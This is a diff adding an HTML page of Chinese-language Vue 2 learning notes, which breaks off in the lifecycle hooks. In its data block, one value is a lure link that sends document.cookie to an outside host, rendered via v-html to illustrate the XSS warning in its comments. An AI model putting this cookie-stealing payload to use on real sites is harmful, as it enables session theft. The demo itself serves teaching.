@@ -1,0 +1,1208 @@
+<!DOCTYPE html>
+<html>
+    
+<head>
+    <meta charset="UTF-8"/>
+    <title>Vue基础知识和原理</title>
+    <script type="text/javascript" src="https://cdn.bootcss.com/vue/2.6.10/vue.js"></script>
+    <!-- <script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.12/dayjs.min.js"></script> -->
+    <style>
+        *{
+            padding:20px;
+        }
+        .box1{
+            background-color: red;
+        }
+        .box2{
+             background-color: green;
+        }
+        .box3{
+             background-color: blue;
+             height:200px;
+             width: 100px;
+             overflow: auto;
+        }
+        .demo{
+            background-color: thistle;
+        }
+        .basic{
+            height:200px;
+            width:200px;
+            background-color: black;
+        }
+        .happy{
+            background-color: red;
+        }
+        .sad{
+
+            background-color: blue;
+        }
+        .normal{
+            background-color: yellow;
+        }
+        .a{
+            height:200px;
+        }
+        .b{
+            background-color: green;
+        }
+        .c{
+            border-radius: 20px;
+        }
+        /* 所有包含v-cloak的元素都会被隐藏 */
+        [v-cloak]{
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- 准备一个容器：符合htmml规范，容器里的代码被称为vue模板 -->
+    <div id="root">
+        <!-- 
+            插值语法
+                功能：用于解析标签体内容
+                写法： {{xxx}}  xxx要写js表达式且可以自动读取data中的属性，
+                data中数据发生改变那么页面中用到该数据的地方也会自动更新 
+        -->
+        <h1>插值语法</h1>
+        <h2>Hello ,{{name}}</h2>
+        </hr>
+        <!-- 
+            指令语法 v-？？？
+                功能：用于解析标签（包括标签属性，标签体内容，绑定事件。。。）
+                例子：
+                v-bind:href="xxx" xxx写js表达式且可以读取data中所有属性   
+        -->
+         <h1>指令语法</h1>
+         <!-- 只用加v-bind：才在href后面用js表达式使用data中的数据 ，简写为：-->
+         <a v-bind:href="url">点我跳转</h2>
+        <a :href="Date.now()">日期</a>
+        <a :href="url.toUpperCase()">大写js表达式</a>
+        </hr>
+
+        <!-- 
+            数据绑定：
+                单向绑定(v-bind)：只能由data流向页面
+                双向绑定(v-model)：数据可以在data和页面双向流动，一般用于表单雷元素（input/select)
+                    v-model:value可以简写成v-model  
+        -->
+        <h1>数据绑定</h1>
+        单向数据绑定：<input type="text" v-bind:value="name"/><br/>
+        双向数据绑定: <input type="text" v-model:value="name"/><br/>
+
+
+        <!-- 
+            MVVM模型
+            M（model模型）：对应data数据
+            V（view视图）：模板
+            VM（viewmodel视图模板）：vue实例对象 
+            data中属性都在实例中
+            实例vue属性都在模板可以使用
+        -->
+            <h1>MVVM模型</h1>
+            <div>{{_data}}</div>
+            <div>{{_data.name}}</div>
+            <div>{{$emit}}</div>
+
+
+            <!-- 
+                事件的使用 
+                v-on:xxx或@xxx  xxx为事件名，可以用js表达式，可以接收event对象
+                methods中配置的函数不要用箭头函数，否则this就不是vm
+                methods中配置的函数都是被vue所管理的函数，this的指向是vm或组件实例对象
+                @click="demo" @click="demo($event)"效果一样                     
+            -->
+            <h1>事件</h1>
+        <button v-on:click="show1">点击1</button>
+        <button @click="show1">点击2</button>
+        <button v-on:click="show2(22,$event)  ">点击3</button>
+       
+            <!-- 事件修饰符 -->
+            <!-- .stop 阻止事件冒泡 -->
+            <div class="box1" @click.stop="show1">stop</div>
+            <!-- .prevent 阻止默认事件 -->
+                <form @submit.prevent="submitForm">表格</form>
+            <!-- .capture 事件捕获 -->
+                <div class="box2" @click.capture="show1">capture</div>
+            <!-- .self 只响应当前元素自身的事件 -->
+                <div class="box3" @click.self="show3">self
+                    <button @click.once="show4">once</button>
+                </div>
+            <!-- .once 只响应一次事件  -->
+             <button @click.once="show1">once</button>
+            <!-- .passive 事件不阻止默认事件
+             优先执行默认事件，无需等待事件回调事件执行完毕
+              @wheel记录的是鼠标滚动
+              @srcoll记录滚轮移动
+            
+            -->
+            <ul @wheel.passive="showInfo" class="box3">
+                <li>1</li>
+                <li>2</li>
+                <li>3</li>
+                <li>1</li>
+                <li>2</li>
+                <li>3</li>
+
+             </ul>
+
+             <!-- 阻止默认事件（常用） -->
+             <a href="http://www.baidu.com" @click.prevent="showInfo">点我提示信息</a>
+             <!-- 阻止事件冒泡（常用） -->
+             <div class="demo1" @click="show3">
+                 <button @click.stop="show4">点我提示信息</button>
+                 <!-- 修饰符可以连续写 -->
+                 <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
+             </div>
+             <!-- 事件只触发一次（常用） -->
+             <button @click.once="showInfo">点我提示信息</button>
+
+
+         <!-- 键盘事件    -->
+                        <!-- 常用按键别名 -->
+         <input type="text" placeholder="按下回车提示输入" @keydown.enter="showInfo">
+         <input type="text" placeholder="按下esc提示输入" @keydown.esc="showInfo">
+         <input type="text" placeholder="按下tab提示输入" @keydown.tab="showInfo">
+         <input type="text" placeholder="按下delete提示输入" @keydown.delete="showInfo">
+         <input type="text" placeholder="按下backspace提示输入" @keydown.backspace="showInfo">
+         <input type="text" placeholder="按下space提示输入" @keydown.space="showInfo">
+         <input type="text" placeholder="按下up提示输入" @keydown.up="showInfo">
+         <input type="text" placeholder="按下down提示输入" @keydown.down="showInfo">
+         <input type="text" placeholder="按下left提示输入" @keydown.left="showInfo">
+         <input type="text" placeholder="按下right提示输入" @keydown.right="showInfo">
+         <input type="text" placeholder="按下f1提示输入" @keydown.f1="showInfo">
+         <!-- 系统修饰符 -->
+         <input type="text" placeholder="按下ctrl+a提示输入" @keydown.ctrl.a="showInfo">
+         <input type="text" placeholder="按下alt+a提示输入" @keydown.alt.a="showInfo">
+         <input type="text" placeholder="按下shift+a提示输入" @keydown.shift.a="showInfo">
+         <input type="text" placeholder="按下meta+a提示输入" @keydown.meta.a="showInfo">
+         <!-- 自定义按键别名 -->
+         <input type="text" placeholder="按下ctrl+k提示输入" @keydown.ctrl.k="showInfo">
+         <input type="text" placeholder="按下alt+k提示输入" @keydown.alt.k="showInfo">
+         <input type="text" placeholder="按下shift+k提示输入" @keydown.shift.k="showInfo">
+         <input type="text" placeholder="按下meta+k提示输入" @keydown.meta.k="showInfo">
+         <!-- 组合键 -->
+         <input type="text" placeholder="按下ctrl+shift+a提示输入" @keydown.ctrl.shift.a="showInfo">
+
+          
+         <!-- 计算属性 -->
+         <h1>计算属性</h1>
+         <!-- 插值实现姓名的全名 -->
+         姓：<input type="text" v-model="firstname"><br/><br/>
+         名： <input type="text" v-model="lastname"><br/><br/>
+         <p>全名：>{{firstname.substring(0,1)}}-{{lastname}}</p>
+         <!-- methods实现姓名的全名，methods没有缓存 -->
+         <p>全名：>{{getFullName()}}</p>
+         <!-- 计算属性的实现 -->
+         <p>全名：>{{fullName}}</p>
+    
+         <!-- 监视 -->
+         <h1>监视</h1>
+         <div>today is {{info}}</div>
+        <button @click="isHot=!isHot">切换天气</button>
+        <!-- 深度监视 -->
+         <h2>深度监视</h2>
+         <div>numbers={{numbers}}</div>
+         <div>numbers.a={{numbers.a}}</div>
+         <div>numbers.b={{numbers.b}}</div>
+         <button @click="numbers.a=numbers.a+1">numbers.a++</button>
+         <button @click="numbers.b=numbers.b+1">numbers.b++</button>
+
+         <!-- 绑定样式 -->
+         <h1>绑定样式</h1>
+         <!-- 绑定class样式--字符串写法，适用于样式的类名不确定需要动态指定 -->
+         <div class="basic " :class="mood" @click="changeMood">样式改变</div>
+         <!-- 绑定class样式--数组写法，适用于样式的类名确定 -->
+         <div class="basic" :class="arr" ></div>
+         <div class="basic" :class="['a','b','c']" ></div>
+         <!-- 绑定class样式--对象写法，适用于样式的类名不确定，需要动态指定 -->
+         <div class="basic" :class="classObj" ></div>
+         <div class="basic" :class="{a:false,b:true,c:false}" ></div>
+         <!-- style绑定样式 -->
+         <div class="basic" :style="{'background-color':'blue','border-radius':'20px'}">heihei</div>
+         <div class="basic" :style="styleObj">heihei</div>
+                
+         <!-- 
+                条件渲染
+          v-if：条件判断，根据表达式的值，决定是否渲染标签内容，删除节点费时
+          v-show: 切换频率较高时使用
+         
+         -->
+         <h1>条件渲染</h1>
+         <div v-if="isHot">天气很热0</div>
+         <div v-else>天气很冷</div>
+         <div v-if="!isHot">天气很冷</div>
+         <div v-else-if="isHot">天气很热</div>
+
+         <div v-show="isHot">天气很热</div>
+         <div v-show="!isHot">天气很冷</div>
+         <!-- template只能和v-if一起使用，可以将多个标签内容包裹起来，可以用v-if和v-for一起使用 
+            渲染完template不会作为元素呈现    -->
+         <template v-if="isHot">
+             <div>天气很热1</div>
+             <div>天气很热2</div>
+         </template>
+         <template v-else>
+             <div>天气很冷1</div>
+             <div>天气很冷2</div>
+         </template>
+
+
+         <!-- 列表渲染 -->
+         <h1>列表渲染</h1>
+         <!-- 遍历数组 -->
+         <h2>v-for遍历数组</h2>
+         <ul>
+             <li v-for="p in persons" :key="p.id">{{p.name}}-{{p.age}}</li>
+         </ul>
+         <ul>
+            <li v-for="(p,index) in persons" :key="index">{{p.name}}-{{p.age}}-{{index}}</li>
+        </ul>
+        <!-- 遍历对象 -->
+         <h2>v-for遍历对象</h2>
+        <ul>
+            <li v-for="(value,key) of persons[0]" :key="key">{{key}}-{{value}}</li>
+        </ul>
+        <!-- v-for可以遍历字符串 -->
+         <h2>v-for遍历字符串</h2>
+        <ul>
+            <li v-for="(char,index) of 'hello'">{{char}}-{{index}}</li>
+        </ul>
+        <!-- v-for可以遍历数字 -->
+         <h2>v-for遍历数字</h2>
+        <ul>
+            <li v-for="n in 5">{{n}}</li>
+        </ul>
+
+         <!-- key的作用和原理 
+            最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
+            如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的 
+         -->
+         <h1>key的作用和原理</h1>
+         <h2>以index作为key</h2>
+         <ul>
+             <li v-for="(p,index) in persons" :key="index">{{p.name}}-{{p.age}}
+                <input type="text" >
+
+             </li>
+         </ul>
+         <h2>以对象属性作为key</h2>
+         <ul>
+            <li v-for="p in persons" :key="p.id">{{p.name}}-{{p.age}}
+                <input type="text">
+            </li>
+        </ul>
+        <button @click="add">修改</button>
+
+
+
+        <!-- 列表过滤 -->
+         <h1>列表过滤</h1>
+         <input type="text" v-model="keyWord">
+         <ul>
+            <li v-for="p in filterPersons" :key="p.id">{{p.name}}-{{p.age}}</li>
+        </ul>
+        <!-- 列表排序 -->
+         <h1>列表排序</h1>
+         <input type="text" v-model="keyWord">
+         <button @click="sortType=1">升序</button>
+         <button @click="sortType=-1">降序</button>
+         <button @click="sortType=0">原顺序</button>
+         <ul>
+            <li v-for="p in filterPersons" :key="p.id">{{p.name}}-{{p.age}}</li>
+        </ul>
+
+
+         <!-- 表单处理 
+         没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+         配置input的value属性:
+         v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
+         v-model的初始值是数组，那么收集的的就是value组成的数组     
+            备注：v-model的三个修饰符：
+            lazy：失去焦点再收集数据
+            number：输入字符串转为有效的数字
+            trim：输入首尾空格过滤
+         -->
+         
+         <h1>表单处理</h1>
+         <form @submit.prevent="demo">
+            账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
+            密码：<input type="password" v-model="userInfo.password"> <br/><br/>
+            年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
+            性别：
+            男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
+            女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
+            爱好：
+            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
+            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
+            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
+            <br/><br/>
+            所属校区
+            <select v-model="userInfo.city">
+                <option value="">请选择校区</option>
+                <option value="beijing">北京</option>
+                <option value="shanghai">上海</option>
+                <option value="shenzhen">深圳</option>
+                <option value="wuhan">武汉</option>
+            </select>
+            <br/><br/>
+            其他信息：
+            <textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
+            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>
+            <button>提交</button>
+        </form>
+
+        <!-- 过滤器 
+            语法：
+
+            注册过滤器：Vue.filter(name,callback) 或 new Vue{filters:{}}
+            使用过滤器：{{ xxx | 过滤器名}} 或 v-bind:属性 = “xxx | 过滤器名” 
+        
+        -->
+         <h1>过滤器</h1>
+         <h2>显示格式化后的时间</h2>
+        <!-- 计算属性实现 -->
+        <h3>现在是：{{ fmtTime }}</h3>
+        <!-- methods实现 -->
+        <h3>现在是：{{ getFmtTime() }}</h3>
+        <!-- 过滤器实现 -->
+        <h3>现在是：{{time | timeFormater}}</h3>
+        <!-- 过滤器实现（传参） -->
+        <h3>现在是：{{time | timeFormater('YYYY_MM_DD') | mySlice}}</h3>
+        <h3 :x="msg | mySlice">{{msg | mySlice}}</h3>
+
+
+        <!-- 内置指令 -->
+        <h1>内置指令</h1>
+        <!-- v-text指令：(使用的比较少)
+        1.作用：向其所在的节点中渲染文本内容。
+        2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。 -->
+        <div>你好，{{name}}</div>
+        <div v-text="name"></div>
+        <!-- 1.作用：向指定节点中渲染包含html结构的内容。
+        2.与插值语法的区别：
+        v-html会替换掉节点中所有的内容，{{xx}}则不会。
+        v-html可以识别html结构。
+        3.严重注意：v-html有安全性问题！！！！(可以使用 cookie
+        插件从某个浏览器登陆的cookie下载下来，到另外一个浏览器未登陆的上传cookie)
+        在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+        一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
+        -->
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+        <!--v-cloak指令： 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+            使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。 -->
+        <span v-cloak>{{name}}</span>
+        <!-- v-once所在节点在初次动态渲染后，就视为静态内容了。
+        以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。 -->
+        <span v-once>初始化的n值是:{{ n }}</span>
+        <span>当前的n值是:{{ n }}</span>
+        <button @click="n++">点我n+1</button>
+
+
+         <!-- 跳过其所在节点的编译过程（你写的什么就呈现什么）
+        可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译 -->
+        <!-- <span v-pre>vue其实很简单</span> -->
+        <button @click="show1" id="btn">点我添加input</button>
+
+
+
+        <!-- 自定义指令 -->
+        <h1>自定义指令</h1>
+        <h2>自定义指令-局部指令</h2>
+        <span v-once>初始化的m值是:{{ m }}</span>
+        <span>当前的m值是:{{ m }}</span>
+        <button @click="show2(m,$event)">点我n+1</button>
+        <span v-fbind:value="m">{{m}}</span>
+        <p v-big="m">v-bid</p>
+        <p v-big-number="m">v-big-number</p>
+
+
+        <h2>自定义指令-全局指令</h2>
+        <p v-big="n">v-big</p>
+        <button @click="n++">点我n+1</button>
+        <input type="text" v-fbind:value="n">
+
+
+
+        <h1>生命周期</h1>
+        <span>{{n}}</span>
+
+        <button @click="n++">点我n+1</button>
+        <button @click="bye">点击销毁vue实例</button>
+
+        <!-- 组件
+         console.dir(vue)
+         几个注意点：
+            关于组件名：
+
+            一个单词组成：
+
+            第一种写法(首字母小写)：school
+            第二种写法(首字母大写)：School
+            多个单词组成：
+
+            第一种写法(kebab-case命名)：my-school
+            第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
+
+                    VueComponent
+            student组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
+            我们只需要写或，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
+            特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！(这个VueComponent可不是实例对象)
+            关于this指向：
+            组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
+            console.log(st===hello)//false
+            new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。->data只能是一个函数 不能有el
+            VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm。
+
+            一个重要的内置关系：VueComponent.prototype.proto === Vue.prototype
+            为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
+        -->
+            <!-- 或者这里不写在vue实力写template:`<app></app>` 直接使用组件 -->
+        <app></app>
+    </div>
+ 
+    
+
+
+
+
+
+
+
+
+
+    <script type="text/javascript">
+        const btn = document.getElementById('btn')
+        btn.addEventListener('click',()=>{
+            const input = document.createElement('input')
+            document.getElementById('root').appendChild(input)
+            input.focus()
+          })
+        //表达式：一个表达式会产生一个值 a a+b function(10) x===Y?'A':'B'
+        //js代码（语句）： if（）{}   for（）{}
+
+        Vue.config.devtools=true
+        Vue.config.productionTip = false;//防止vue在启动时生成提示
+        //#region
+        //监视
+        //创建一个监视的实例对象用于检测data中属性的变化
+        //Vue监视数据的原理：
+
+        // vue会监视data中所有层次的数据
+
+        // 如何监测对象中的数据？
+
+        // 通过setter实现监视，且要在new Vue时就传入要监测的数据。
+
+        // 对象中后追加的属性，Vue默认不做响应式处理
+
+        // 如需给后添加的属性做响应式，请使用如下API：
+
+        // Vue.set(target，propertyName/index，value) 或
+
+        // vm.$set(target，propertyName/index，value)
+
+        // 如何监测数组中的数据？
+
+        // 通过包裹数组更新元素的方法实现，本质就是做了两件事：
+
+        // 调用原生对应的方法对数组进行更新
+        // 重新解析模板，进而更新页面
+        // 在Vue修改数组中的某个元素一定要用如下方法：
+
+        // 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
+        // Vue.set() 或 vm.$set()
+        //#endregion
+
+        
+        //非单文件组件
+        //第一步：创建组件
+        
+     
+        //创建student组件
+        // const st = Vue.extend({
+        //     //可以使用name配置项指定组件在开发者工具中呈现的名字。
+        //     name:'学生',
+        //     template:'<div><h1>学生</h1><p>{{name}}</p></div>',
+        //        // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
+        //     data(){
+        //         return{
+        //             name:'张三'
+        //         }
+        //     }
+        // })
+        //简写
+        
+     Vue.prototype.x = 100
+        const st = {
+            template:
+            `<div>
+                <h1>学生</h1>
+                <p>{{name}}</p>
+                <button @click="show">点击我</button>
+            </div>`,
+            data(){
+                return{
+                    name:'张三'
+                }
+            },
+            methods:{
+                //验证vue.prototype == vuecomponent.prototype.__proto__
+                show(){
+                    alert('student组件的x:'+this.x)
+                    console.log('student组件被点击了'+this)
+                }
+            }
+        }
+        //创建teacher组件
+        const teacher = Vue.extend({
+            template:'<div><h1>老师</h1><p>{{name}}</p></div>',
+            data(){
+                return{
+                    name:'李四'
+                }
+            }
+        })
+        //1.创建组件
+
+        const hello = Vue.extend({
+            template:'<div><h1>hello</h1><p>{{msg}}</p></div>',
+            data(){
+                return{
+                    msg:'你好，世界！'
+                }
+            }
+        })
+        //2.注册组件：全局注册组件
+        Vue.component('hello',hello)
+
+
+        const app = Vue.extend({
+            template:
+            `<div>
+                <h1>组件</h1>
+                <hello></hello>
+                <hr>
+                <student></student>
+                <hr>
+                <teacher></teacher>
+                <hr>
+            </div>`,
+            data(){
+                return{
+                    name:'张三'
+                }
+            },
+            components:{
+                hello,
+                teacher,
+                student:st
+            
+            }
+        })
+        Vue.component('app',app)
+
+        //全局过滤器
+        Vue.filter('mySlice',function(value){
+            console.log('mySlice被调用了'+value)          
+            return value.toString().slice(0,1)
+        })
+
+        //创建vue实例 容器和实例只能一对一
+        const x = new Vue({
+            //#regioon
+            //el用于指定当前vue实例为那个容器服务，值通常为css选择器字符串
+            //上面容器为id=’root‘这里就是用'#root',还可以使用document.getElmentByid('root')
+            //上面容器是class='root'这里就是'.root'
+           // el:'#root',
+            //#endregion
+
+           //data写法一：对象形式
+            //data用于存储数据，数据供el中的容器去使用，使用对象
+            // data:{
+            //     name:'hahaha',
+            //     url:''
+            // }
+            //写法二：函数形式
+            //由Vue管理的函数一定不能用箭头函数，否则this就不是实例
+
+           
+            //Vue实例->app->组件
+            // template: `<app></app>`,
+
+            //数据代理通过vm对象代理data里的数据
+            //vm._data.name = vm.data
+            data:()=>{
+
+                return {
+                    n:1,
+                    m:1,
+                    p:1,
+                    str:'<h2>hello</h2>',
+                    str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+                    msg:'hello',
+                    userInfo:{
+                        hobby:[],
+                        city:'beijing',
+                        other:'',
+                        agree:'',
+                        sex:'male'
+                    },
+                    name:'hahaha',
+                     url:'',
+                     firstname:'haha',
+                     lastname:'smile',
+                     //使用watch实现姓名是需要在dadta中写出fullName
+                    //  fullName:this.firstname+'-'+this.lastname,
+                     isHot:true,
+                     numbers:{
+                        a:1,
+                        b:2,
+                        c:3
+                     },
+                     mood:'',
+                     arr:['a','b','c'],
+                     classObj:{
+                         a:true,
+                         b:false,
+                         c:false
+                     },
+                     styleObj:{
+                        backgroundColor:'blue',
+                        borderRadius:'20px'
+                     },
+                     //vuemodel._data.persons.push != Array.propotype.push
+                     //vue 将被监听的数组的变更的方法进行了包裹，所以他们也会触发视图更新，包括push pop shift unshift splice sort reverse
+
+                     persons:[
+                        {
+                            id:'001',
+                            name:'Tom',
+                            age:18
+                        },
+                        {
+                            id:'002',
+                            name:'Jerry',
+                            age:12
+                        },
+                        {
+                            id:'003',
+                            name:'Cat',
+                            age:20
+                        },
+                        {
+                            id:'004',
+                            name:'Dog',
+                            age:2
+                        },
+                        {
+                            id:'005',
+                            name:'Cat2',
+                            age:8
+                        }
+                     ],
+                    //  filterPersons:[],
+                     keyWord:'',
+                     sortType:0,
+                     time:Date.now()
+                
+                }
+            },
+            // data:function(){
+            //     return{
+            //         name:'hahaha',
+            //         url:''
+            //     }
+            // }
+            //#region
+            //解释data为什么写成函数
+            //对象形式
+            // let data = {
+            //     a: 99,
+            //     b: 100
+            // }
+            // let x = data;
+            // let y = data;
+            // // x 和 y 引用的都是同一个对象，修改 x 的值， y 的值也会改变
+            // x.a = 66;
+            // console.loh(x); // a:66 b:100
+            // console.log(y); // a:66 b:100
+
+            // 函数形式
+            // function data() {
+            //     return {
+            //         a: 99,
+            //         b: 100
+            //     }
+            // }
+            // let x = data();
+            // let y = data();
+            // console.log(x === y); // false
+            // 我的理解是函数每调用一次就创建一个新的对象返回给他们
+            //#endregion
+
+
+            methods:{
+                getFmtTime(){
+                    const date = new Date(this.time); // 获取当前时间
+                    const year = date.getFullYear();
+                    const month = String(date.getMonth() + 1).padStart(2, '0'); // 月份从0开始，所以需要+1
+                    const day = String(date.getDate()).padStart(2, '0');
+                    const hours = String(date.getHours()).padStart(2, '0');
+                    const minutes = String(date.getMinutes()).padStart(2, '0');
+                    const seconds = String(date.getSeconds()).padStart(2, '0');
+
+                    return `${year}年${month}月${day}日 ${hours}:${minutes}:${seconds}`;
+                },
+                demo(){
+                    console.log(JSON.stringify(this.userInfo))
+                },
+                show1(event){
+                    console.log(event)
+                    
+                    alert(event)
+                },
+                // show1(this){
+                //     console.log(this)
+                // },
+                show2(num,event){
+                    num++
+                    alert(`你点击了${num}次`+event)
+                },
+                show3(){
+                    alert('你点击了demo1')
+                },
+                show4(){
+                    alert('你点击了demo1的按钮')
+                },
+                submitForm(event){
+                    event.preventDefault()
+                    console.log('表单提交')
+                },
+                showInfo(event){
+                    console.log('你点击了提示信息'+event)
+                },
+                getFullName(){
+                         return this.firstname+'-'+this.lastname
+                },
+                changeMood(){
+                    const moods=['happy','sad','normal']
+                    this.mood = moods[Math.floor(Math.random()*moods.length)]
+                },
+                add(){
+                    this.persons.push({
+                        id:'004',
+                        name:'Dog',
+                        age:21
+                    
+                    })
+                },
+                bye(){
+                    console.log('你点击了bye')
+                    this.$destroy() //销毁当前实例，销毁后所有指令失效
+                }
+                
+            },
+            //#region
+            //computed和watch的区别：
+            //computed能完成的功能，watch都可以完成
+            //watch能完成的功能，computed不一定能完成，例如异步操作
+            //两个重要原则：
+            //1.所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm/组件实例对象
+            //2.所有不被Vue管理的函数（定时器、ajax、Promise），最好写成箭头函数，这样this的指向才是vm
+            //#endregion
+
+
+            //computed会缓存计算结果，只有当依赖的属性变化时才会重新计算/初次使用该属性
+            //计算属性的get函数会在读取属性时调用，set函数会在写入属性时调用
+            //计算属性默认只有get函数，但是也可以设置set函数
+            //完整写法
+            computed:
+            {
+                fmtTime(){
+                    const date = new Date(this.time); // 假设 this.time 是一个时间戳或日期字符串
+                    const year = date.getFullYear();
+                    const month = String(date.getMonth() + 1).padStart(2, '0'); // 月份从0开始，所以需要+1
+                    const day = String(date.getDate()).padStart(2, '0');
+                    const hours = String(date.getHours()).padStart(2, '0');
+                    const minutes = String(date.getMinutes()).padStart(2, '0');
+                    const seconds = String(date.getSeconds()).padStart(2, '0');
+
+                    return `${year}年${month}月${day}日 ${hours}:${minutes}:${seconds}`;
+
+                },
+                //这是一个属性！！！在vm中可以直接使用
+                fullName:{
+                    get(){
+                        console.log('计算属性get')
+                        return this.firstname+'-'+this.lastname
+                    },
+                    set(value){
+                        console.log('计算属性set')
+                        let arr = value.split('-')
+                        this.firstname = arr[0]
+                        this.lastname = arr[1]
+                    }
+                },
+                filterPersons(){
+                    let arr =  this.persons.filter(p=>p.name.includes(this.keyWord))
+                    console.log(arr)
+                    if(this.sortType!==0){
+                        arr.sort((p1,p2)=>{
+                            return this.sortType===1?p1.age-p2.age:p2.age-p1.age
+                        })
+                    }
+                    return arr
+                   
+                },
+                
+                //#region
+                //简写：只有get没有set
+                //异步运算不适合使用computed，使用watch
+                // fullName(){
+                //     console.log('计算属性get')
+                //       setTimeout(()=>{
+                //       return this.firstname+'-'+this.lastname
+                //     },2000)
+                //     // return this.firstname+'-'+this.lastname
+                // },
+                //#endregion
+                info(){
+                    return this.isHot?'热':'冷'
+                },
+                
+
+            },
+            //watch用于监听data中的属性，当属性发生变化时，会执行回调函数
+            //.Vue中的watch默认不监测对象内部值的改变（一层）
+            //Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以
+            watch:
+            {
+                // keyWord:{
+                //     immediate:true,//立即执行回调函数,没有输入，调用handler此时newVal为空字符串''
+                //     handler(newVal){
+                //         console.log(`搜索关键字${newVal}`);
+                //         this.filterPersons = this.persons.filter(p=>p.name.includes(newVal)) 
+                //     }
+                    
+                // },
+
+                //完整写法
+                isHot:
+                {
+                    immediate:true,//立即执行回调函数
+                    // deep:true,//深度监听，监听对象内部属性变化
+                    //isHot发生改变时调用
+                    handler(newVal,oldVal){
+                        console.log(`天气变化了，现在是${newVal}`)
+                    }
+                 },
+                 //简写
+                // isHot(newVal,oldVal){
+                //     console.log(`简写：天气变化了，现在是${newVal}`)
+                // },
+                 //监视多级结构中某个属性的变化
+                'numbers.a':{
+                    handler(newVal,oldVal){
+                        console.log(`a的值变化了，现在是${newVal}`)
+                    }
+                },
+                numbers:{
+                    deep:true,//深度监听，监听对象内部属性变化
+                    //当属性内部结构的属性发生改变时，会调用handler函数
+                    //即numbers会发生改变
+                    //numbers发生改变时调用
+                    handler(newVal,oldVal){
+                        console.log(`numbers的值变化了，现在是${newVal}`)
+                    }
+                },
+                //#region
+
+                //使用watch实现fullName
+                //如果直接表现fullNamewatch效果没有computed号
+                //但是对于异步任务如下，watch使用效果最好
+                // firstname(newVal){
+                //     setTimeout(()=>{
+                //         this.fullName = newVal+'-'+this.lastname
+                //     },1000)
+                // },
+                // lastname(newVal){
+                //     this.fullName = this.firstname+'-'+newVal
+                // }
+                //#endregion
+
+                //局部过滤器
+               
+           
+           
+        }
+        ,
+            //有个s！！！！
+            //局部过滤器在页面初始化就可以生效，但是全局过滤器生效取决于他和vue定义的顺序
+            filters:{
+                timeFormater(value) {
+                    console.log('过滤器timeFormater被调用了' + value);
+
+                    const date = new Date(value); 
+                    const year = date.getFullYear();
+                    const month = String(date.getMonth() + 1).padStart(2, '0'); // 月份从0开始，所以需要+1
+                    const day = String(date.getDate()).padStart(2, '0');
+                    const hours = String(date.getHours()).padStart(2, '0');
+                    const minutes = String(date.getMinutes()).padStart(2, '0');
+                    const seconds = String(date.getSeconds()).padStart(2, '0');
+
+                    return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
+                }
+            },
+          
+            directives: {
+                // big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
+                 'big-number'(element,binding){
+                            // console.log('big')
+                            element.innerText = binding.value * 10
+                        }, 
+                big (element,binding){
+                    console.log('big',this) //注意此处的this是window
+                    // console.log('big')
+                    element.innerText = binding.value * 10
+                },
+                fbind: {
+                    //指令与元素成功绑定时（一上来）
+                    bind (element,binding){
+                        element.value = binding.value
+                    },
+                    //指令所在元素被插入页面时
+                    inserted (element,binding){
+                        element.focus()
+                    },
+                    //指令所在的模板被重新解析时
+                    update (element,binding){
+                        element.value = binding.value
+                    }
+                }
+            }
+                ,
+            //生命周期
+            //没有vue数据和方法
+            beforeCreate(){
+                console.log('beforeCreate')
+                console.log(this)
+                // debugger;//断点调试
+
+            },
+            //实例创建完成，数据观测开始，实例已完成数据观测，但还没有开始渲染过程。
+            //此时实例的属性和方法都可以使用，但无法保证其依赖的计算属性和方法的计算结果是最新的。
+            //实例的属性和方法已准备就绪，可以进行数据绑定，但无法保证绑定是最新的。
+            created(){
+                console.log('created')
+                console.log(this)
+            },
+            beforeMount(){
+                console.log('beforeMount')
+                console.log(this)
+                // debugger;//断点调试
+            },
+            //常用的生命钩子：发送ajax请求，渲染页面，绑定事件，定时器，订阅消息。
